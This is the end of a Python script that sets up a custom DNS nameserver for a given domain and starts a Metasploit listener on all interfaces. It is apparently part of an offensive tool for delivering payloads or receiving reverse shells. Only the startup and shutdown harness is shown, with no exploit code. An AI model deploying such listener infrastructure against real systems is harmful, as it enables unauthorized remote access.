    ns_records.append(NS(D.ns1))
    ns_records.append(NS(D.ns2))

    DnsServer.create(args.domain, args.ipaddr, ns_records)

    logger.info("Creating MSF listener ...")
    listener = MSFListener('0.0.0.0', args.lport)
    listener.start_loop()

    logger.info("Starting nameserver ...")
    servers = [SocketServer.UDPServer(('', args.dport), UDPRequestHandler),
               SocketServer.TCPServer(('', args.dport), TCPRequestHandler)]

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        logger.info("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while True:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        logger.info("Shutdown server...")
        for s in servers:
            s.shutdown()
        listener.shutdown()
        logging.shutdown()


if __name__ == '__main__':
    main()
